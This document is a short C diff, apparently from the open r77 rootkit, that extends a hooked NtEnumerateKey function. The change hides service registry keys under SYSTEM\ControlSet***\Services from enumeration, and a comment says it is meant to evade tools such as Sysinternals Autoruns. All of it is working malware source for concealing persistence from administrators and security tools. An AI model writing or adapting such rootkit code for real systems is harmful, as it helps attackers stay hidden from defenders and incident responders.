@@ -473,6 +473,7 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 	}
 
 	BYTE buffer[1024];
+	BYTE keyNameInfo[500];
 	PNT_KEY_BASIC_INFORMATION basicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;
 
 	for (; i <= index; correctedIndex++)
@@ -482,7 +483,33 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 			return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
 		}
 
-		if (!HasPrefix(basicInformation->Name))
+		BOOL hidden = FALSE;
+
+		if (HasPrefix(basicInformation->Name))
+		{
+			hidden = TRUE;
+		}
+		else if (NT_SUCCESS(R77_NtQueryObject(key, ObjectNameInformation, keyNameInfo, 500, NULL)))
+		{
+			// Some tools, such as Sysinternals autoruns, enumerate services through this registry key:
+			// \REGISTRY\MACHINE\SYSTEM\ControlSet001\Services
+			PUNICODE_STRING parentName = (PUNICODE_STRING)keyNameInfo;
+
+			if (parentName->Length / sizeof(WCHAR) >= 30 &&
+				StrStrNIW(parentName->Buffer, L"\\SYSTEM\\ControlSet", parentName->Length / sizeof(WCHAR)) &&
+				!StrCmpNIW(&parentName->Buffer[parentName->Length / sizeof(WCHAR) - 9], L"\\Services", 9))
+			{
+				// We are in SYSTEM\ControlSet***\Services
+
+				basicInformation->Name[basicInformation->NameLength / sizeof(WCHAR)] = L'\0';
+				if (IsServiceNameHidden(basicInformation->Name))
+				{
+					hidden = TRUE;
+				}
+			}
+		}
+
+		if (!hidden)
 		{
 			i++;
 		}
